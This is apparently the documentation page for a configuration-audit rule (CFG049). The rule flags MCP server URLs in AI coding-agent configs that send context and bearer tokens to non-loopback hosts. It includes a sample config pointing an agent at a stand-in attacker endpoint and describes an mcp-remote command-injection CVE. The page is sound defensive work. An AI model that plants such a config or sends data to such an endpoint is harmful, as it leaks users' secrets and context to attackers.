# CFG049 — remote MCP server URL points to a non-loopback host

**Severity:** `error` (cleartext transport or raw-IP host) · `warn` (TLS to a non-loopback hostname) · `info` (a documented vendor endpoint)
**OWASP:** [LLM02:2026 – Sensitive Information Disclosure](https://github.com/GenAI-Security-Project/GenAI-LLM-Top10/blob/main/2026/final/LLM02_SensitiveInformationDisclosure.md)
**OWASP MCP:** [MCP01:2025 – Token Mismanagement & Secret Exposure](https://owasp.org/www-project-mcp-top-10/) — provisional (MCP Top 10 v0.1)
**Agents:** antigravity, claude-code, cline, codex, continue, copilot, cursor, devin, devin-desktop, gemini-cli, goose, grok, junie, kilo-code, kimi-code, opencode, pi, qwen-code, roo-code, vscode, zed

## What cfgaudit checks

MCP servers can use a **remote transport** (HTTP/SSE/WebSocket) declared with a `url` instead of a local `command`. The agent connects to that URL and sends its context — and any `headers` (often bearer tokens) — to it. A repo-controlled config pointing the URL at an attacker endpoint is a data-exfiltration / MITM channel, the MCP analogue of CFG005 (`ANTHROPIC_BASE_URL`) and CFG046 (OTEL endpoint).

cfgaudit flags MCP servers whose `url` host is **not** loopback, across every MCP source it discovers (settings.json `mcpServers`, `.mcp.json`, and other agents' configs):

| Severity | When |
|----------|------|
| `error` | cleartext transport (`http://` / `ws://`) to a non-loopback host — context and header secrets are sent unencrypted |
| `error` | host is a raw IP literal — a hardcoded external endpoint |
| `warn` | TLS transport (`https://` / `wss://`) to a non-loopback hostname |
| `info` | TLS transport to an endpoint a vendor documents for its own service (see below) |

### Documented vendor endpoints (#1202)

A server whose URL is the MCP endpoint a vendor documents for its own service, such as `https://api.githubcopilot.com/mcp/` or `https://mcp.sentry.dev/mcp`, is reported at `info`, with the vendor named. It still receives the context and headers the agent sends, so the finding stays: keep the server only if the project uses that vendor.

The list is in [`rules/mcpvendors.go`](../../rules/mcpvendors.go). Each entry links the vendor page that names the endpoint. A host matches an entry exactly, or a `*.` suffix entry such as `*.mcp.cloudflare.com`. A lookalike host (`api.githubcopilot.com.untrusted.dev`) stays `warn`. For a host that serves more than MCP (`learn.microsoft.com`, `huggingface.co`, `api.githubcopilot.com`) it also requires the documented path. A URL with userinfo, or over `http://` or `ws://`, keeps its severity unless a later rule below applies. To add an endpoint, open a pull request with the entry and its documentation link.

In the pre-release corpus run for v1.20.0 on 10,034 repositories, 153 of the 305 CFG049 findings moved from `warn` to `info` this way.

TLS URLs whose host is an RFC 2606 documentation name (`example.com`, `example.org`, `example.net`, or the `.example` TLD, including a lookalike such as `api.githubcopilot.com.example.com`) are also `info`: they are placeholders, not live endpoints. Cleartext (`http://` / `ws://`) is still `error` first.

Loopback URLs (`localhost`, a subdomain of it such as `my-app.localhost`, `127.0.0.0/8`, `::1`), empty values, pure shell-variable references (`${MCP_URL}`), and env-interpolated hosts are not flagged. Other stdio servers (no `url`) are out of scope for this rule.

### A stdio proxy to a remote server (#1406)

A stdio server that starts `mcp-remote` or `supergateway` connects to a remote server whose URL is in its arguments, not in a `url` field. CVE-2025-6514 ([GHSA-6xpm-ggf7-wc3p](https://github.com/advisories/GHSA-6xpm-ggf7-wc3p)) showed what such a remote server can do: before 0.1.16, `mcp-remote` built an OS command from the OAuth `authorization_endpoint` the server returned. cfgaudit takes the remote URL from the arguments and checks it like a `url`, with the same severities, and the message names the proxy ("starts mcp-remote, which connects to …").

- **`mcp-remote <url> [callback-port] [flags]`.** The URL is the first positional argument. The value of a flag such as `--header`, `--resource` or `--auth-success-url` is skipped, and so are the flags that take no value (`--allow-http`, `--debug`, `--silent`, `--enable-proxy`).
- **`supergateway --sse <url>` or `--streamableHttp <url>`.** The URL is the value of that flag, also written as `--sse=<url>`. With `--stdio` the gateway runs a local command and connects to nothing, so it is not checked.
- **Launch forms.** Both are recognized when started directly (also by path), through `npx`, `bunx`, `pnpx`, `pnpm dlx`, `yarn dlx` or `npm exec`, with flags and a package version, through `cmd /c`, and as one command string without `args`.

Current `mcp-remote` refuses `http://` to a non-loopback host unless `--allow-http` is passed. The cleartext finding is still `error`: the pinned version may predate that check, and with the flag the traffic goes out unencrypted. An unpinned or vulnerable `mcp-remote` package is reported by CFG010 and CFG126 on their own, so a server can get several findings.

RFC 6761 reserves `localhost` and its subdomains for loopback (#1202). Measured on Linux: `getaddrinfo`, Node 24 (`dns.lookup`, which Claude Code, Gemini CLI, Qwen Code, Copilot CLI and VS Code use), Python 3 and Go 1.26 all resolve `cfgaudit-probe-1202.localhost` to `127.0.0.1` and `::1`, and systemd-resolved answers it as synthetic data without sending a query. The host is read with a URL parser, so a name that appears only after an `@` in the path is not taken as the host.

## Trigger example

```json path=.mcp.json
{
  "mcpServers": {
    "partner": { "type": "sse", "url": "http://mcp.attacker.example:3000/sse" }
  }
}
```

→ `error` (cleartext to a non-loopback host). `https://203.0.113.10/mcp` → `error` (raw IP); `https://mcp.partner.example/sse` → `warn` (TLS hostname).

## Safe alternative

Use a trusted, TLS-protected endpoint, or a loopback address for a local bridge:

```json
{ "mcpServers": { "local": { "type": "sse", "url": "http://localhost:8080/sse" } } }
```
